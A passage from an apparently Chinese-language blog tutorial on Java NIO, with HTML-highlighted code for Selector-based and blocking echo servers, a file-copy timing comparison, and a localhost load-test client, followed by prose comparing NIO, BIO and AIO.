class="type">ServerSocketChannel</span> <span class="variable">serverSocket</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">        serverSocket.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8080</span>));</span><br><span class="line">        serverSocket.configureBlocking(<span class="literal">false</span>);  <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">        serverSocket.register(selector, SelectionKey.OP_ACCEPT);  <span class="comment">// 注册选择器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            selector.select();  <span class="comment">// 阻塞直到有事件触发</span></span><br><span class="line">            Iterator&lt;SelectionKey&gt; keys = selector.selectedKeys().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">                <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keys.next();</span><br><span class="line">                keys.remove();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (key.isAcceptable()) &#123;  <span class="comment">// 处理连接请求</span></span><br><span class="line">                    <span class="type">ServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> server.accept();</span><br><span class="line">                    client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    client.register(selector, SelectionKey.OP_READ);  <span class="comment">// 注册读事件</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;  <span class="comment">// 处理读请求</span></span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">256</span>);</span><br><span class="line">                    client.read(buffer);</span><br><span class="line">                    System.out.println(<span class="string">&quot;Received message: &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(buffer.array()).trim());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中：</p><ul><li>创建了一个<code>Selector</code>用于管理多个通道。</li><li>通过<code>ServerSocketChannel</code>建立服务器套接字，并设置为非阻塞模式。</li><li>将通道注册到选择器上，监听<code>OP_ACCEPT</code>（连接请求）事件。</li><li>选择器等待事件触发，通过迭代处理每个就绪的<code>SelectionKey</code>，实现非阻塞I&#x2F;O。</li></ul><h2 id="6-Java-NIO的优缺点"><a href="#6-Java-NIO的优缺点" class="headerlink" title="6. Java NIO的优缺点"></a>6. <strong>Java NIO的优缺点</strong></h2><p>传统 IO 基于字节流或字符流（如 FileInputStream、BufferedReader 等）进行文件读写，以及使用 Socket 和 ServerSocket 进行网络传输。<br>NIO 使用通道（Channel）和缓冲区（Buffer）进行文件操作，以及使用 SocketChannel 和 ServerSocketChannel 进行网络传输。<br>传统 IO 采用阻塞式模型，对于每个连接，都需要创建一个独立的线程来处理读写操作。当一个线程在等待 I&#x2F;O 操作时，无法执行其他任务。这会导致大量线程的创建和销毁，以及上下文切换，降低了系统性能。<br>NIO 使用非阻塞模型，允许线程在等待 I&#x2F;O 时执行其他任务。这种模式通过使用选择器（Selector）来监控多个通道（Channel）上的 I&#x2F;O 事件，实现了更高的性能和可伸缩性。</p><p>以下是 NIO 在网络传输中优于传统 I&#x2F;O 的原因：<br>①、NIO 支持非阻塞 I&#x2F;O，这意味着在执行 I&#x2F;O 操作时，线程不会被阻塞。这使得在网络传输中可以有效地管理大量并发连接（数千甚至数百万）。而在操作文件时，这个优势没有那么明显，因为文件读写通常不涉及大量并发操作。<br>②、NIO 支持 I&#x2F;O 多路复用，这意味着一个线程可以同时监视多个通道（如套接字），并在 I&#x2F;O 事件（如可读、可写）准备好时处理它们。这大大提高了网络传输中的性能，因为单个线程可以高效地管理多个并发连接。操作文件时这个优势也无法提现出来。<br>③、NIO 提供了 ByteBuffer 类，可以高效地管理缓冲区。这在网络传输中很重要，因为数据通常是以字节流的形式传输。操作文件的时候，虽然也有缓冲区，但优势仍然不够明显。</p><ul><li><p><strong>优点</strong>：</p><ul><li>高性能：支持非阻塞I&#x2F;O和多路复用，大大减少了线程开销和阻塞时间。</li><li>更适合网络编程：NIO的结构适合开发高并发的网络应用程序，特别是I&#x2F;O密集型服务。</li></ul></li><li><p><strong>缺点</strong>：</p><ul><li>开发复杂度高：与传统I&#x2F;O相比，NIO的编程复杂度更高，需要处理选择器、缓冲区等。</li><li>适用场景有限：适合I&#x2F;O密集型应用，但对CPU密集型应用的性能提升有限。</li></ul></li></ul><h3 id="NIO-和传统-IO-在操作文件时的差异"><a href="#NIO-和传统-IO-在操作文件时的差异" class="headerlink" title="NIO 和传统 IO 在操作文件时的差异"></a>NIO 和传统 IO 在操作文件时的差异</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.FileChannel;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="comment">// 使用传统 I/O 方法传输文件</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">long</span> <span class="title function_">transferFile</span><span class="params">(File source, File des)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!des.exists())</span><br><span class="line">            des.createNewFile();</span><br><span class="line">        <span class="comment">// 创建输入输出流</span></span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(source));</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(des));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用数组传输数据</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span>((len = bis.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">            bos.write(bytes, <span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">return</span> endTime - startTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 NIO 方式传输文件</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> <span class="title function_">transferFileWithNIO</span><span class="params">(File source, File des)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!des.exists())</span><br><span class="line">            des.createNewFile();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建随机存取文件对象</span></span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">read</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(source, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">write</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(des, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建文件通道</span></span><br><span class="line">        <span class="type">FileChannel</span> <span class="variable">readChannel</span> <span class="operator">=</span> read.getChannel();</span><br><span class="line">        <span class="type">FileChannel</span> <span class="variable">writeChannel</span> <span class="operator">=</span> write.getChannel();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建并使用ByteBuffer 传输数据</span></span><br><span class="line">        <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">while</span>(readChannel.read(byteBuffer) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            byteBuffer.flip();</span><br><span class="line">            writeChannel.write(byteBuffer);</span><br><span class="line">            byteBuffer.clear();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭文件通道</span></span><br><span class="line">        writeChannel.close();;</span><br><span class="line">        readChannel.close();</span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">return</span> endTime - startTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">transferfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        <span class="type">File</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/home/dell/下载/Clash.for.Windows-0.20.35-win.7z&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">des</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;a.7z&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">nio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;b.7z&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 比较时间</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> transferfile.transferFile(source, des);</span><br><span class="line">        System.out.println(time + <span class="string">&quot;普通字节流时间&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">timeNio</span> <span class="operator">=</span> transferfile.transferFileWithNIO(source, nio);</span><br><span class="line">        System.out.println(timeNio + <span class="string">&quot;NIO时间&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：<br><img src="/2024/11/04/code/javanio/image-1.png"><br>文件越大的情况下，竟然普通字节流（传统 IO）的速度更快,NIO的魅力主要是在网络当中</p><h3 id="NIO-和传统-IO-在网络传输中的差异"><a href="#NIO-和传统-IO-在网络传输中的差异" class="headerlink" title="NIO 和传统 IO 在网络传输中的差异"></a>NIO 和传统 IO 在网络传输中的差异</h3><p>IO，用的套接字，其中<br>Socket 和 ServerSocket 是传统的阻塞式 I&#x2F;O 编程方式，用于建立和管理 TCP 连接。<br>Socket：表示客户端套接字，负责与服务器端建立连接并进行数据的读写。<br>ServerSocket：表示服务器端套接字，负责监听客户端连接请求。当有新的连接请求时，ServerSocket 会创建一个新的 Socket 实例，用于与客户端进行通信。<br>在传统阻塞式 I&#x2F;O 编程中，每个连接都需要一个单独的线程进行处理，这导致了在高并发场景下的性能问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IOSever</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8080</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> client.getInputStream();</span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> client.getOutputStream();</span><br><span class="line">                </span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                </span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">                client.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NIO，为了解决传统阻塞式 I&#x2F;O 的性能问题，Java NIO 引入了 ServerSocketChannel 和 SocketChannel。它们是非阻塞 I&#x2F;O，可以在单个线程中处理多个连接。<br>ServerSocketChannel：类似于 ServerSocket，表示服务器端套接字通道。它负责监听客户端连接请求，并可以设置为非阻塞模式，这意味着在等待客户端连接请求时不会阻塞线程。<br>SocketChannel：类似于 Socket，表示客户端套接字通道。它负责与服务器端建立连接并进行数据的读写。SocketChannel 也可以设置为非阻塞模式，在读写数据时不会阻塞线程。</p><p>Selector 是 Java NIO 中的一个关键组件，用于实现 I&#x2F;O 多路复用。它允许在单个线程中同时监控多个 ServerSocketChannel 和 SocketChannel，并通过 SelectionKey 标识关注的事件。当某个事件发生时，Selector 会将对应的 SelectionKey 添加到已选择的键集合中。通过使用 Selector，可以在单个线程中同时处理多个连接，从而有效地提高 I&#x2F;O 操作的性能，特别是在高并发场景下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建ServerSocketChannel</span></span><br><span class="line">            <span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">            <span class="comment">// 绑定端口</span></span><br><span class="line">            serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8081</span>));</span><br><span class="line">            <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">            serverSocketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 Selector</span></span><br><span class="line">            <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">            <span class="comment">// 将ServerSocketChannel 注册到 Selector ,关注 OP_ACCEPT 事件</span></span><br><span class="line">            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 无限循环，处理事件</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="comment">// 阻塞直到有事件发生</span></span><br><span class="line">                selector.select();</span><br><span class="line">                <span class="comment">// 获取发生事件的 SelectionKey</span></span><br><span class="line">                Iterator&lt;SelectionKey&gt; iterator = selector.selectedKeys().iterator();</span><br><span class="line">                <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">                    <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">                    <span class="comment">// 处理完成后，从selectdKeys集合中删除</span></span><br><span class="line">                    iterator.remove();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 判断事件类型</span></span><br><span class="line">                    <span class="keyword">if</span>(key.isAcceptable())&#123;</span><br><span class="line">                        <span class="comment">// 有新的连接请求</span></span><br><span class="line">                        <span class="type">ServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                        <span class="comment">// 接受连接</span></span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> server.accept();</span><br><span class="line">                        <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">                        client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                        <span class="comment">// 将新的SocketChannel 注册到Selector，关注 OP_READ事件</span></span><br><span class="line">                        client.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                        <span class="comment">// 有数据可读</span></span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line">                        <span class="comment">// 创建 ByteBuffer 缓冲区</span></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                        <span class="comment">// 从 SocketChannel 中读取并写入 ByteBuffer</span></span><br><span class="line">                        client.read(buffer);</span><br><span class="line">                        <span class="comment">// 翻转ByteBuffer，准备读取</span></span><br><span class="line">                        buffer.flip();</span><br><span class="line">                        <span class="comment">// 将数据从ByteBuffer写回到 SocketChannel</span></span><br><span class="line">                        client.write(buffer);</span><br><span class="line">                        <span class="comment">// 关闭连接</span></span><br><span class="line">                        client.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码创建了一个基于 Java NIO 的简单 TCP 服务器。它使用 ServerSocketChannel 和 Selector（后面会讲） 实现了非阻塞 I&#x2F;O 和 I&#x2F;O 多路复用。服务器循环监听事件，当有新的连接请求时，接受连接并将新的 SocketChannel 注册到 Selector，关注 OP_READ 事件。当有数据可读时，从 SocketChannel 中读取数据并写入 ByteBuffer，然后将数据从 ByteBuffer 写回到 SocketChannel。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">clientCount</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">executorServiceIO</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">executorServiceNIO</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用传统IO的客户端</span></span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">ioClient</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8080</span>);</span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">                out.write(<span class="string">&quot;hello 你好啊&quot;</span>.getBytes());</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                in.read(buffer);</span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用传统IO的客户端</span></span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">nioClient</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> SocketChannel.open();</span><br><span class="line">                socketChannel.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8081</span>));</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap(<span class="string">&quot;你好啊 这个是nio&quot;</span>.getBytes());</span><br><span class="line">                socketChannel.write(buffer);</span><br><span class="line">                buffer.clear();</span><br><span class="line">                socketChannel.read(buffer);</span><br><span class="line">                socketChannel.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分别测试性能</span></span><br><span class="line">        <span class="type">long</span> startTime, endTime;</span><br><span class="line"></span><br><span class="line">        startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; clientCount; i++)&#123;</span><br><span class="line">            executorServiceIO.execute(ioClient);</span><br><span class="line">        &#125;</span><br><span class="line">        executorServiceIO.shutdown();</span><br><span class="line">        executorServiceIO.awaitTermination(<span class="number">1</span>, TimeUnit.MINUTES);</span><br><span class="line">        endTime = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;传统IO服务器处理&quot;</span> + clientCount + <span class="string">&quot;个客户端耗时&quot;</span> + (endTime - startTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br><span class="line">        startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; clientCount; i++)&#123;</span><br><span class="line">            executorServiceNIO.execute(nioClient);</span><br><span class="line">        &#125;</span><br><span class="line">        executorServiceNIO.shutdown();</span><br><span class="line">        executorServiceNIO.awaitTermination(<span class="number">1</span>, TimeUnit.MINUTES);</span><br><span class="line">        endTime = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;NIO服务器处理&quot;</span> + clientCount + <span class="string">&quot;个客户端耗时&quot;</span> + (endTime - startTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/04/code/javanio/image-2.png" alt="可以看出NIO快了一些"></p><h2 id="NIO、BIO和AIO的区别"><a href="#NIO、BIO和AIO的区别" class="headerlink" title="NIO、BIO和AIO的区别"></a>NIO、BIO和AIO的区别</h2><p>NIO 与原来的 I&#x2F;O 有同样的作用和目的, 他们之间最重要的区别是数据打包和传输的方式。原来的 I&#x2F;O 以流的方式处理数据，而 NIO 以块的方式处理数据。<br>面向流的 I&#x2F;O 系统一次一个字节地处理数据。一个输入流产生一个字节的数据，一个输出流消费一个字节的数据。<br>面向块的 I&#x2F;O 系统以块的形式处理数据。每一个操作都在一步中产生或者消费一个数据块。按块处理数据比按(流式的)字节处理数据要快得多。但是面向块的 I&#x2F;O 缺少一些面向流的 I&#x2F;O 所具有的优雅性和简单性。</p><p>Java AIO，全称 Asynchronous IO，是异步非阻塞的 IO。是一种非阻塞异步的通信模式。<br>在 NIO 的基础上引入了新的异步通道的概念，并提供了异步文件通道和异步套接字通道的实现。</p><p>BIO （Blocking I&#x2F;O）：同步阻塞 I&#x2F;O 